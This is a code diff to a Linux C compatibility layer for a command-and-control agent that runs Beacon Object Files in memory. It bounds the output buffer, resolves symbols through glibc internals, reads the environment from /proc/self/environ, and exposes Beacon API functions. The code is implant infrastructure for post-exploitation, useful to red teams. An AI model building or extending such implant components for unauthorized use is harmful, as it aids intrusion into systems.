@@ -15,6 +15,11 @@
 
 #include "beacon_compat.h"
 
+/* Bound the captured output. Keep it below the agent's 10 MiB tunnel frame
+ * cap so one BOF result fits in one response, and so a BOF that prints
+ * without end cannot grow the agent's heap without limit. */
+#define BOF_OUTPUT_MAX (8u << 20)
+
 static char *output_buf = NULL;
 static size_t output_len = 0;
 static size_t output_cap = 0;
@@ -22,10 +27,14 @@ static size_t output_cap = 0;
 static void output_append(const char *data, size_t len) {
   if (data == NULL || len == 0)
     return;
+  if (len > BOF_OUTPUT_MAX - 1u - output_len)
+    return;
   if (output_len + len + 1 > output_cap) {
     size_t new_cap = output_cap ? output_cap * 2 : 4096;
     if (new_cap < output_len + len + 1)
       new_cap = output_len + len + 4096;
+    if (new_cap > BOF_OUTPUT_MAX)
+      new_cap = BOF_OUTPUT_MAX;
     char *new_buf = realloc(output_buf, new_cap);
     if (!new_buf)
       return;
@@ -170,9 +179,7 @@ void BeaconFormatInt(formatp *format, int value) {
   format->buffer += 4;
 }
 
-int BeaconIsAdmin(void) {
-  return geteuid() == 0;
-}
+int BeaconIsAdmin(void) { return geteuid() == 0; }
 
 void BeaconDataParse(datap *parser, char *buffer, int size) {
   if (parser == NULL)
@@ -244,59 +251,135 @@ char *BeaconDataExtract(datap *parser, int *size) {
 }
 
 #if defined(__GLIBC__)
-extern void *__libc_dlopen_mode(const char *name, int mode);
+/* glibc's internal dlsym() accepts RTLD_DEFAULT (NULL) and searches the global
+ * scope, so the loader neither opens libc nor links libdl. */
 extern void *__libc_dlsym(void *handle, const char *name);
-#define C2_DLOPEN(name, mode) __libc_dlopen_mode(name, mode)
-#define C2_DLSYM(handle, name) __libc_dlsym(handle, name)
+#define C2_DLSYM(name) __libc_dlsym(NULL, name)
 #else
-#define C2_DLOPEN(name, mode) dlopen(name, mode)
-#define C2_DLSYM(handle, name) dlsym(handle, name)
+#define C2_DLSYM(name) dlsym(RTLD_DEFAULT, name)
 #endif
 
-void *beacon_host_dlsym(const char *name) {
-  static void *libc;
-  if (libc == NULL) {
-#if defined(__GLIBC__)
-    /* __libc_dlopen_mode has no NULL/global handle; open libc itself. */
-    libc = C2_DLOPEN("libc.so.6", 1);
-#else
-    libc = C2_DLOPEN(NULL, 1);
-#endif
-  }
-  return libc != NULL ? C2_DLSYM(libc, name) : NULL;
-}
+void *beacon_host_dlsym(const char *name) { return C2_DLSYM(name); }
+
+/* getEnviron must return a live char **. Resolving the environ data symbol
+ * through __libc_dlsym(NULL, ...) works for functions on some hosts but not
+ * for data, and a direct environ import needs a data relocation the C agent's
+ * in-memory loader does not apply. Read /proc/self/environ once instead and
+ * keep the parsed array for the lifetime of the mapped loader. */
+static char **env_cache;
+static char *env_cache_buf;
 
 static char **get_environ(void) {
-  char ***envp = (char ***)beacon_host_dlsym("environ");
-  return envp != NULL ? *envp : NULL;
+  if (env_cache != NULL)
+    return env_cache;
+
+  FILE *f = fopen("/proc/self/environ", "rb");
+  if (f == NULL)
+    return NULL;
+
+  size_t cap = 4096;
+  char *buf = (char *)malloc(cap);
+  if (buf == NULL) {
+    fclose(f);
+    return NULL;
+  }
+  size_t len = 0;
+  for (;;) {
+    if (len == cap) {
+      if (cap >= (1u << 20)) {
+        free(buf);
+        fclose(f);
+        return NULL;
+      }
+      size_t next = cap * 2;
+      char *grown = (char *)realloc(buf, next);
+      if (grown == NULL) {
+        free(buf);
+        fclose(f);
+        return NULL;
+      }
+      buf = grown;
+      cap = next;
+    }
+    size_t n = fread(buf + len, 1, cap - len, f);
+    if (n == 0)
+      break;
+    len += n;
+  }
+  int failed = ferror(f);
+  fclose(f);
+  if (failed || len == 0) {
+    free(buf);
+    return NULL;
+  }
+  if (buf[len - 1] != '\0') {
+    if (len == cap) {
+      char *grown = (char *)realloc(buf, cap + 1);
+      if (grown == NULL) {
+        free(buf);
+        return NULL;
+      }
+      buf = grown;
+      cap++;
+    }
+    buf[len++] = '\0';
+  }
+
+  size_t count = 0;
+  for (size_t i = 0; i < len; i++) {
+    if (buf[i] == '\0' && i + 1 < len && buf[i + 1] != '\0')
+      count++;
+  }
+  char **out = (char **)calloc(count + 2, sizeof(char *));
+  if (out == NULL) {
+    free(buf);
+    return NULL;
+  }
+  size_t n = 0;
+  out[n++] = buf;
+  for (size_t i = 0; i + 1 < len; i++) {
+    if (buf[i] == '\0' && buf[i + 1] != '\0')
+      out[n++] = buf + i + 1;
+  }
+  out[n] = NULL;
+
+  env_cache = out;
+  env_cache_buf = buf;
+  return env_cache;
 }
-static const char *get_os_name(void) {
-  return "lin";
+
+/* Release the parsed environment after a BOF run. The loader image is mapped
+ * per execution, so keeping it tied to the run avoids leaking one copy per
+ * invocation in the agent process. */
+void beacon_env_reset(void) {
+  free(env_cache);
+  free(env_cache_buf);
+  env_cache = NULL;
+  env_cache_buf = NULL;
 }
+static const char *get_os_name(void) { return "lin"; }
 
 static const struct {
   const char *name;
   void *fn;
-} beacon_apis[] = {
-    {"BeaconPrintf", (void *)BeaconPrintf},
-    {"BeaconOutput", (void *)BeaconOutput},
-    {"BeaconDataParse", (void *)BeaconDataParse},
-    {"BeaconDataInt", (void *)BeaconDataInt},
-    {"BeaconDataShort", (void *)BeaconDataShort},
-    {"BeaconDataLength", (void *)BeaconDataLength},
-    {"BeaconDataExtract", (void *)BeaconDataExtract},
-    {"BeaconFormatAlloc", (void *)BeaconFormatAlloc},
-    {"BeaconFormatReset", (void *)BeaconFormatReset},
-    {"BeaconFormatFree", (void *)BeaconFormatFree},
-    {"BeaconFormatAppend", (void *)BeaconFormatAppend},
-    {"BeaconFormatPrintf", (void *)BeaconFormatPrintf},
-    {"BeaconFormatToString", (void *)BeaconFormatToString},
-    {"BeaconFormatInt", (void *)BeaconFormatInt},
-    {"BeaconIsAdmin", (void *)BeaconIsAdmin},
-    {"swap_endianess", (void *)swap_endianess},
-    {"getEnviron", (void *)get_environ},
-    {"getOSName", (void *)get_os_name},
-};
+} beacon_apis[] = { { "BeaconPrintf", (void *)BeaconPrintf },
+                    { "BeaconOutput", (void *)BeaconOutput },
+                    { "BeaconDataParse", (void *)BeaconDataParse },
+                    { "BeaconDataInt", (void *)BeaconDataInt },
+                    { "BeaconDataShort", (void *)BeaconDataShort },
+                    { "BeaconDataLength", (void *)BeaconDataLength },
+                    { "BeaconDataExtract", (void *)BeaconDataExtract },
+                    { "BeaconFormatAlloc", (void *)BeaconFormatAlloc },
+                    { "BeaconFormatReset", (void *)BeaconFormatReset },
+                    { "BeaconFormatFree", (void *)BeaconFormatFree },
+                    { "BeaconFormatAppend", (void *)BeaconFormatAppend },
+                    { "BeaconFormatPrintf", (void *)BeaconFormatPrintf },
+                    { "BeaconFormatToString", (void *)BeaconFormatToString },
+                    { "BeaconFormatInt", (void *)BeaconFormatInt },
+                    { "BeaconIsAdmin", (void *)BeaconIsAdmin },
+                    { "swap_endianess", (void *)swap_endianess },
+                    { "getEnviron", (void *)get_environ },
+                    { "getOSName", (void *)get_os_name }, };
 
 void *beacon_api_lookup(const char *name) {
   if (name == NULL)
